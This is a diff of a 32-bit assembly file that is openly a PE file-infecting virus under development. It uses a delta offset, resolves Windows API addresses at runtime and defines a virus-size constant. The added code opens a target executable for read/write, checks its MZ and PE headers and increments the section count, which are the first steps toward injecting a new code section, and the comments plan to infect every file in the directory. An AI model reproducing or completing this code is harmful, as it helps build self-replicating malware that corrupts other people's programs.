@@ -1,5 +1,4 @@
 ; donothing.asm FOR 32 BIT archs only
-; DELTA OFFSET // CALL 0 => data a la fin
 ; new section -> addr la plus grande d une section + sa taille
 ; si pas la place -> quit
 ; bonus: UPX unpacker
@@ -80,29 +79,44 @@ deltaoffset:
     push    edi ; PE header
     push    esi ; DOS header
     call    ent_get_function_addr
-    nop
-    nop
 
     ; TODO: foreach file in current dir
     ; Open a file (TODO: use each file)
     push    0 ; attr template
-    push    FILE_ATTRIBUTE_NORMAL
+    push    FILE_ATTRIBUTE_NORMAL 
     push    OPEN_EXISTING
     push    0 ; default security
-    push    0 ; do not share
-    push    GENERIC_WRITE
+    mov     ebx,FILE_SHARE_READ
+    xor     ebx,FILE_SHARE_WRITE
+    push    ebx ; read && write
+    mov     ebx,GENERIC_READ
+    xor     ebx,GENERIC_WRITE
+    push    ebx ; read && write
     mov     ebx,ebp
     add     ebx,offset testFile
     sub     ebx,offset deltaoffset
     push    ebx ; .exe path
     call    eax ; CreateFile()
-   
+
+    push    eax ; save the fd
     ; Create a new section
     push    eax ; File descriptor
-    push    ebx ; Delta offset
+    push    ebp ; Delta offset
     push    edi ; PE header
     push    esi ; DOS header
     call new_code_section
+
+    pop     ebx ; restore the fd    
+    mov     eax,ebp
+    add     eax,offset CloseHandle_b
+    sub     eax,offset deltaoffset
+    push    eax ; Address of the func name
+    push    edi ; PE header
+    push    esi ; DOS header
+    call    ent_get_function_addr  
+    ; CloseHandle(fd)
+    push    ebx
+    call    eax  
 
     call exit_success
     
@@ -125,9 +139,134 @@ new_code_section:
     push    esi
     push    edi
 
-    ; TODO
+    ; Get ReadFile addr
+    mov     eax,[ebp+16]
+    add     eax,offset ReadFile_b
+    sub     eax,offset deltaoffset
+    push    eax ; Address of the func name
+    push    [ebp+12] ; PE header
+    push    [ebp+8]  ; DOS header
+    call    ent_get_function_addr
+    push    eax ; [ebp - 16]
+    ; Get WriteFile addr
+    mov     eax,[ebp+16]
+    add     eax,offset WriteFile_b
+    sub     eax,offset deltaoffset
+    push    eax ; Address of the func name
+    push    [ebp+12] ; PE header
+    push    [ebp+8]  ; DOS header
+    call    ent_get_function_addr
+    push    eax ; [ebp-20]
+    ; Get SetFilePointer addr
+    mov     eax,[ebp+16]
+    add     eax,offset SetFilePointer_b
+    sub     eax,offset deltaoffset
+    push    eax ; Address of the func name
+    push    [ebp+12] ; PE header
+    push    [ebp+8]  ; DOS header
+    call    ent_get_function_addr
+    push    eax ; [ebp-24]
+
+    ;[ebp-16] => readfile addr
+    ;[ebp-20] => writefile addr
+    ;[ebp-24] => setfilepointer addr
+    ; make room for a read of 512 at @esp
+    sub     esp,512
+    mov     esi,esp ; save esp
+
+    ; Read(fd, esi, 2, 0, 0)
+    mov     ebx,[ebp-16]
+    push    0
+    push    0
+    push    2
+    push    esi
+    push    [ebp+20]
+    call    ebx
+    cmp     word ptr [esi],"ZM"
+    jne     exit_fail ; we should have MZ in the stack
+
+    ; Move to the new offset header field in the PE header
+    mov     ebx,[ebp-24]
+    push    FILE_BEGIN
+    push    0
+    push    03Ch
+    push    [ebp + 20]
+    call    ebx
+
+    ; Read(fd, esi, 4, 0, 0)
+    mov     ebx,[ebp-16]
+    push    0
+    push    0
+    push    4
+    push    esi
+    push    [ebp+20]
+    call    ebx
+
+    xor eax,eax
+    mov eax,[esi] ; Get the offset to the PE header
+
+    ; Move to the PE header
+    mov     ebx,[ebp-24]
+    push    FILE_BEGIN
+    push    0
+    push    eax
+    push    [ebp+20]
+    call    ebx
+
+    ; Read(fd, esi, 2, 0, 0)
+    mov     ebx,[ebp-16]
+    push    0
+    push    0
+    push    4
+    push    esi
+    push    [ebp+20]
+    call    ebx
+    cmp     word ptr [esi],"EP"
+    jne     exit_fail ; we should have EP in the stack
+
+    ; Move to the Number of section field
+    mov     ebx,[ebp-24]
+    push    FILE_CURRENT
+    push    0
+    push    2
+    push    [ebp+20]
+    call    ebx
+
+    ; Read(fd, esi, 4, 0, 0) nsection
+    mov     ebx,[ebp-16]
+    push    0
+    push    0
+    push    2
+    push    esi
+    push    [ebp+20]
+    call    ebx
+
+    ; inc the number of section
+    xor ecx,ecx
+    mov cx,[esi]
+    inc cx 
+    mov [esi],cx
+
+    ; Move to the Number of section field
+    mov     ebx,[ebp-24]
+    push    FILE_CURRENT
+    push    0
+    push    -2
+    push    [ebp+20]
+    call    ebx
+
+    ; Write the updated number of section
+    mov     ebx,[ebp-20]
+    push    0
+    push    0
+    push    2
+    push    esi
+    push    [ebp+20]
+    call    ebx
 
     ; cleanup/return
+    add     esp,12 ; alloc for func ptrs
+    add     esp,512 ; alloc for read/write
     pop     edi
     pop     esi
     pop     ebx
@@ -669,12 +808,15 @@ _data:
    testStr         db "bite",0
    virusSize       equ jambi_end - start
 
-   FindFirstFile_b db  "FindFirstFileA",0
-   FindNextFile_b  db  "FindNextFileA",0
-   ExitProcess_b   db  "ExitProcess",0
-   Beep_b          db  "Beep",0
-   CreateFile_b    db  "CreateFileA",0
-   WriteFile_b     db  "WriteFile",0
+   FindFirstFile_b  db  "FindFirstFileA",0
+   FindNextFile_b   db  "FindNextFileA",0
+   ExitProcess_b    db  "ExitProcess",0
+   Beep_b           db  "Beep",0
+   CreateFile_b     db  "CreateFileA",0
+   WriteFile_b      db  "WriteFile",0
+   CloseHandle_b    db  "CloseHandle",0
+   SetFilePointer_b db  "SetFilePointer",0
+   ReadFile_b       db  "ReadFile",0
 
 jambi_end:
 end start
